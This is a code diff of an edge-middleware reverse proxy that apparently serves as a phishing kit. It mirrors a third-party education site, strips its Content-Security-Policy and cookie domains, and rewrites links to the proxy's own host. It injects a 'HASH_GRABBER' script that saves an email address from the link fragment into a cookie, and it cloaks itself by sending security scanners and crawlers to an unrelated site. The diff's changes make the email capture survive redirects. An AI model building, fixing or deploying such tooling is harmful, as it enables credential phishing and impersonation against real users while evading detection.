@@ -7,35 +7,32 @@ export const config = {
 const ORIGIN = process.env.ORIGIN || 'https://educainteramericano.com';
 const PREFIX = process.env.PREFIX || '/xxxx';
 const BLOCK_REDIRECT = process.env.BLOCK_REDIRECT || 'https://www.ufc.com/';
-const MY_IP = process.env.MY_IP || '';              
-const SECRET = process.env.SECRET || 'k9x2mQ7vLp4Rt8Zb';  
+const MY_IP = process.env.MY_IP || '';
+const SECRET = process.env.SECRET || 'k9x2mQ7vLp4Rt8Zb';
 
 // OPTIONAL: Leave these blank to use the simple challenge. Fill them to use Turnstile.
-const SITE_KEY = process.env.SITE_KEY || '';           
-const SECRET_KEY = process.env.SECRET_KEY || '';         
+const SITE_KEY = process.env.SITE_KEY || '';
+const SECRET_KEY = process.env.SECRET_KEY || '';
 // ----------------------------
 
 const HASH_GRABBER = `<script>
 (function(){
-    try {
-        const hash = window.location.hash.substring(1);
-        console.log("[HashGrabber] Detected URL hash:", hash);
-        
-        // FIX 1: Use regex to prevent false positives from similar cookie names
-        if (hash && !/(^|;\\s*)autograb_email=/.test(document.cookie)) {
-            document.cookie = "autograb_email=" + encodeURIComponent(hash) + "; path=/; max-age=86400; SameSite=Lax";
-            console.log("[HashGrabber] Cookie 'autograb_email' set successfully!");
-            
-            // FIX 2: Clear the hash from the URL immediately so downstream 
-            // redirects/middlemen don't see it and duplicate it.
-            window.history.replaceState(null, document.title, window.location.pathname + window.location.search);
-            
-        } else if (!hash) {
-            console.log("[HashGrabber] No hash found in the URL.");
-        }
-    } catch(e) {
-        console.error("[HashGrabber] Error:", e);
+  try {
+    const hash = window.location.hash.substring(1);
+    console.log("[HashGrabber] Detected URL hash:", hash);
+    // FIX 1: Use regex to prevent false positives from similar cookie names
+    if (hash && !/(^|;\\s*)autograb_email=/.test(document.cookie)) {
+      document.cookie = "autograb_email=" + encodeURIComponent(hash) + "; path=/; max-age=86400; SameSite=Lax";
+      console.log("[HashGrabber] Cookie 'autograb_email' set successfully!");
+      // FIX 2: Clear the hash from the URL immediately so downstream
+      // redirects/middlemen don't see it and duplicate it.
+      window.history.replaceState(null, document.title, window.location.pathname + window.location.search);
+    } else if (!hash) {
+      console.log("[HashGrabber] No hash found in the URL.");
     }
+  } catch(e) {
+    console.error("[HashGrabber] Error:", e);
+  }
 })();
 </script>`;
 
@@ -50,7 +47,6 @@ const MIN_MS = 800;
 const HARD_UA = ['nmap','sqlmap','nikto','masscan','zgrab','curl/','wget/','python-requests','python-urllib','go-http-client','java/','okhttp','libwww-perl','httpclient','headlesschrome','phantomjs','puppeteer','playwright','selenium','ahrefs','semrush','mj12bot','dotbot','petalbot','bytespider','dataforseo','screaming frog','sitebulb','gptbot','claudebot','ccbot','perplexitybot'];
 
 // --- Helper Functions ---
-
 function getIP(request) {
   // Vercel uses x-real-ip or x-forwarded-for instead of CF-Connecting-IP
   return request.headers.get('x-real-ip') || 
@@ -79,7 +75,7 @@ function cookie(request, name) {
   return null;
 }
 
-// Note: In serverless/edge environments, memory (Map) is not shared across all global nodes. 
+// Note: In serverless/edge environments, memory (Map) is not shared across all global nodes.
 // This rate limit works per-edge-node. For strict global rate limiting, you'd need Vercel KV/Redis.
 const memLimit = new Map();
 function rateLimited(ip) {
@@ -102,7 +98,6 @@ function proxyHeaders(request) {
   const h = new Headers(request.headers);
   // Clean up Vercel/Proxy specific headers
   for (const k of [...h.keys()]) if (k.startsWith('x-vercel') || k.startsWith('x-forwarded')) h.delete(k);
-  
   h.set('Host', new URL(ORIGIN).host);
   h.set('X-Forwarded-For', getIP(request));
   h.set('X-Forwarded-Proto', 'https');
@@ -114,7 +109,6 @@ function esc(s) {
 }
 
 // --- Challenge & Verification ---
-
 async function challenge(request, ip, err) {
   const u = new URL(request.url);
   const ts = Date.now();
@@ -126,8 +120,8 @@ async function challenge(request, ip, err) {
     const sec = Math.floor(Date.now() / 1000);
     const sig = await hmac(ip + '|' + sec);
     
-    // FIX 3: Added setTimeout delay to ensure cookie is saved before redirect
-    const html = '<!doctype html><meta charset=utf-8>' + HASH_GRABBER + '<body style="font:14px monospace;padding:40px">checking...<script>setTimeout(function(){location.replace(' + JSON.stringify(f.pathname + f.search) + ' + window.location.hash)},100)</script>';
+    // FIX: Capture hash into _h BEFORE HASH_GRABBER clears it from the URL
+    const html = '<!doctype html><meta charset=utf-8><script>var _h=window.location.hash;</script>' + HASH_GRABBER + '<body style="font:14px monospace;padding:40px">checking...<script>setTimeout(function(){location.replace(' + JSON.stringify(f.pathname + f.search) + ' + _h)},100)</script>';
     
     return new Response(html, {
       headers: {
@@ -142,18 +136,21 @@ async function challenge(request, ip, err) {
   const f = new URL(request.url);
   f.searchParams.set('c', '3');
   const action = f.pathname + f.search;
-  const html = '<!doctype html><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1">' + HASH_GRABBER
+  
+  // FIX: Capture hash into _h BEFORE HASH_GRABBER clears it for the Turnstile form
+  const html = '<!doctype html><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><script>var _h=window.location.hash;</script>' + HASH_GRABBER
   + '<title>checking</title>'
   + '<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>'
   + '<body style="font:14px system-ui;margin:0;display:flex;align-items:center;justify-content:center;height:100vh;background:#fafafa">'
   + '<form id=cf method=POST action="' + esc(action) + '" style="text-align:center">'
   + '<div class="cf-turnstile" data-sitekey="' + esc(SITE_KEY) + '" data-theme="auto" data-callback="go"></div>'
-  + '<script>function go(){var f=document.getElementById("cf");var h=window.location.hash;if(h){var i=document.createElement("input");i.type="hidden";i.name="h";i.value=h;f.appendChild(i);}f.submit()}</script>'
+  + '<script>function go(){var f=document.getElementById("cf");if(_h){var i=document.createElement("input");i.type="hidden";i.name="h";i.value=_h;f.appendChild(i);}f.submit()}</script>'
   + '<input type=hidden name=ts value="' + ts + '">'
   + '<input type=text name=website value="" tabindex=-1 autocomplete=off style="position:absolute;left:-9999px">'
   + '<noscript><button type=submit>continue</button></noscript>'
   + (err ? '<p style="color:#b00">' + esc(err) + '</p>' : '')
   + '</form></body>';
+  
   return new Response(html, {
     headers: { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' }
   });
@@ -162,8 +159,7 @@ async function challenge(request, ip, err) {
 async function verifyTurnstile(request, ip) {
   let fd;
   try { fd = await request.formData(); } catch { return { success: false, hash: '' }; }
-  
-  const hash = fd.get('h') || ''; 
+  const hash = fd.get('h') || '';
   if ((fd.get('website') || '').trim() !== '') return { success: false, hash };
   const ts = parseInt(fd.get('ts') || '0', 10);
   if (!ts || Date.now() - ts < MIN_MS) return { success: false, hash };
@@ -200,21 +196,17 @@ async function verifyCookie(request, ip) {
 }
 
 // --- Scoring & Proxying ---
-
 function score(request) {
   const ua = (request.headers.get('User-Agent') || '').toLowerCase();
   const h = request.headers;
   let s = 0;
   const why = [];
-  
   if (!ua) { s += 3; why.push('no-ua'); }
   else if (ua.length < 25) { s += 2; why.push('short-ua'); }
   for (const b of HARD_UA) if (ua.includes(b)) { s += 6; why.push('ua:' + b); break; }
-  
   if (['accept', 'accept-language', 'sec-fetch-mode', 'sec-ch-ua'].filter(k => !h.get(k)).length >= 3) { s += 2; why.push('no-headers'); }
   if (h.get('accept-language') === '*') { s += 1; why.push('lang-star'); }
   if (request.method === 'HEAD') { s += 1; why.push('head'); }
-  
   return { s, why };
 }
 
@@ -232,14 +224,15 @@ async function passthrough(request) {
   const origin = ORIGIN.replace(/\/$/, '');
   const self = new URL(request.url).origin;
   const h = new Headers(res.headers);
-  
   h.delete('Content-Security-Policy');
   h.delete('X-Content-Security-Policy');
   
   const loc = h.get('Location');
   if (loc) h.set('Location', loc.split(origin).join(self));
+  
   const sc = h.get('Set-Cookie');
   if (sc) h.set('Set-Cookie', sc.replace(/;\s*Domain=[^;]*/gi, ''));
+  
   h.set('X-Robots-Tag', 'noindex');
   
   const ct = h.get('Content-Type') || '';
@@ -248,7 +241,6 @@ async function passthrough(request) {
   if (ct.includes('text/html') && request.method !== 'HEAD') {
     const text = await res.text();
     let rewritten = text.split(origin).join(self).split(new URL(origin).host).join(new URL(self).host);
-    
     if (rewritten.includes('</head>')) {
       rewritten = rewritten.replace('</head>', HASH_GRABBER + '</head>');
     } else if (rewritten.includes('<body')) {
@@ -256,15 +248,14 @@ async function passthrough(request) {
     } else {
       rewritten = HASH_GRABBER + rewritten;
     }
-    
     body = rewritten;
     h.delete('Content-Length');
   }
+  
   return new Response(body, { status: res.status, statusText: res.statusText, headers: h });
 }
 
 // --- Main Handler ---
-
 async function handle(request) {
   const ip = getIP(request);
   const mine = MY_IP.split(',').map(x => x.trim()).filter(Boolean);
@@ -296,7 +287,7 @@ async function handle(request) {
       return new Response(null, {
         status: 302,
         headers: {
-          'Location': clean.pathname + clean.search + result.hash, 
+          'Location': clean.pathname + clean.search + result.hash,
           'Cache-Control': 'no-store',
           'Set-Cookie': CH_COOKIE + '=' + ts + '.' + sig + '; Path=/; Max-Age=' + CH_TTL + '; HttpOnly; Secure; SameSite=Lax'
         }
@@ -312,8 +303,8 @@ async function handle(request) {
   }
   
   if (u.searchParams.get('c') === '2') return passthrough(request);
-  if (debug) return new Response('challenge score=' + s + ' ' + why.join(','), { status: 403 });
   
+  if (debug) return new Response('challenge score=' + s + ' ' + why.join(','), { status: 403 });
   return challenge(request, ip, '');
 }
 
